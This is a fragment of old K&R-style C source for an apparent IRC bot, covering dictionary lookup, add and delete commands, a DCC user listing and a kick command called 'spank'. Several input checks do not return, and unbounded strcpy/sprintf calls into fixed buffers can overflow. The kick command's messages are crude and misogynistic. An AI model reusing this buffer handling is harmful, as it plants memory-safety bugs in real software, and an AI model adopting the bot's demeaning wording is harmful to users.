		send_to_user(from, "\002Please enter a word to lookup\002");
	}
	else if (chan && !word) {
		word = chan;
	}

	for (aVar = current->dList; aVar; aVar = aVar->next) {
		if (!matches(word, aVar->user)) {
			isthere = 1;
			if (ischannel(to)) {
				sendprivmsg(chan, "\002%s\002 %s", aVar->user, aVar->data2);
			}
			else {
				send_to_user(from, "\002%s\002 %s", aVar->user, aVar->data2);
			}
			if (maxul >= ASSTLEVEL) {
				send_to_user(from, "-- \037%s\037 Added on \002%s\002 by \002%s\002", word, time2str(aVar->time), getnick(aVar->data1));
			}
		}
	}
	
	if (!isthere) {
		send_to_user(from, "-- Could not find \002%s\002, maybe you should add it?", word);
	}
}

void do_d_dictionary(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *word;
	aBigList *aVar, *aVarT;
	
	word = get_token(&rest, " ");
	
	if (!word) {
		send_to_user(from, "\002Please enter a word to lookup\002");
	}

	aVar = current->dList;
	while (aVar) {
		if (!matches(word, aVar->user)) {
			aVarT = aVar->next;
			send_to_user(from, "Deleting word \002%s\002", aVar->user);
			remove_biglist(&current->dList, aVar);
			aVar = aVarT;
		}
		else {
			aVar = aVar->next;
		}
	}
}

void do_dictionary_s(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aBigList *aVar;
	int i = 0;
	
	for (aVar = current->dList; aVar; aVar = aVar->next) {
		i++;
	}
	
	send_to_user(from, "I currently know \002%i\002 words", i);
}

void do_a_dictionary(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aBigList *aVar;
	char *word, *test, *test2;
	char tbuf[MAXLEN];
	
	word = get_token(&rest, " ");
	
	if (!word) {	
		send_to_user(from, "\002Please enter a word and definition\002");
	}
	
	test = strcpy(tbuf, rest);
	test2 = get_token(&test, " ");
	if (!test2) {
		send_to_user(from, "\002Please enter a description for the word\002");
	}
	
	if (aVar = find_biglist(&current->dList, word)) {
		send_to_user(from, "I already know \002%s\002", word);
		return;
	}
	else {
		make_biglist(&current->dList, word, getthetime(), 1, from, rest);
		send_to_user(from, "-- Added \002%s\002", word);
	}
}

void do_whom(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aDCC *client;
	int maxul;
	
	send_to_user(from, "\037Current DCC Connections\n\037");
	for (client = current->Client_list; client; client = client->next) {
		if (client->flags & DCC_CHAT) {
			maxul = max_userlevel(client->user);
			send_to_user(from, "-> \002%10s\002  Level:\002%4i\002  Idle:\002%4i\002m (\002%i\002s)", getnick(client->user), maxul, ((getthetime()-client->lasttime) / 60), (getthetime()-client->lasttime));
		}
	}
}

void do_spank(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan, *who, *t, tb[MAXLEN];
	
	chan = get_channel(to, &rest);
	who = get_token(&rest, " ");
	
	if (!chan || !who) {
		send_to_user(from, "What bitch do you want me to spank? and where do you want me to spank her?");
		return;
	}
	
	t = get_token(&rest, " ");
	
	if (!my_stricmp(who, "me")) {
		who = getnick(from);
		t = strcpy(tb, "yew want a spankin' huh? howz this? ");
	}
	
	if (t) {
		sprintf(tb, "%s %s", t, rest);
		sendkick(chan, who, tb);
	}
	else {
		sendkick(chan, who, "EYE AM PIMPBOT, DON'T MAKE ME KUTCH YEW %s", who);
	}
}
